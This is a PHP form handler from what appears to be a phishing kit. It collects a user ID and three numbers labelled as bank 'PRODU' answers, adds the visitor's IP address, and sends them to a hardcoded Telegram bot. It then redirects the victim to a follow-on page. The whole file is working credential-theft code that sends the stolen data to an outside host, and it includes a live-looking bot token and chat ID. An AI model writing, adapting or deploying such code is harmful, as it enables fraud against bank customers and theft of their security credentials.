<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Supongamos que necesitas pasar $dni, asegúrate de que está definido o asignado correctamente antes de usarlo
$dni = $_POST['dni'] ?? 'valor_predeterminado'; // Cambia 'valor_predeterminado' por lo que sea apropiado

$apiToken = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ";
$chatId = "5157616506";

$userid = $_POST['userid'] ?? 'No proporcionado';
$num1 = $_POST['num1'] ?? 'No proporcionado';
$num2 = $_POST['num2'] ?? 'No proporcionado';
$num3 = $_POST['num3'] ?? 'No proporcionado';
$ip = $_SERVER['REMOTE_ADDR'];

$message = "RESPUESTAS PRODU:\nUsuario: $userid\nNúmero 1: $num1\nNúmero 2: $num2\nNúmero 3: $num3\nIP: $ip";

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));

// Utiliza urlencode solo si $dni no es null
if ($dni !== null) {
    $dni = urlencode($dni);
}

// Coloca esto en la parte superior del archivo para evitar errores de cabecera
header('Location: index2.1.php?userid=' . urlencode($userid));
exit();
?>